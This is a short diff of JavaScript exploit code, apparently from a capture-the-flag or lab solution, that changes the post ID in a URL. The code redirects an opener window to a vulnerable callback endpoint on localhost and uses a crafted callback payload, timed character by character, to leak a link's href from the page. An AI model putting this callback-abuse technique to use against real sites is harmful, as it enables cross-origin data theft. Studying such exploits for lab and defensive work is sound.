@@ -10,7 +10,7 @@
             // I'm explainig this payload below
             PAYLOAD = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].href[${i}]].focus`;
             // change c.html page's location to the vulnerable page that executes callback
-            opener.location.replace(`http://localhost:12345/post/?id=24bc9bc5-844c-4f37-8330-f3dbadd2e3a3?callback=${PAYLOAD}%23%00`);
+            opener.location.replace(`http://localhost:12345/post/?id=0eb8b4c2-44ec-44a1-a225-394c6b05e3aa?callback=${PAYLOAD}%23%00`);
             // check the next character every 1.5 secs so that the page have 1.5 sec to load.
             await sleep(1500);
         }
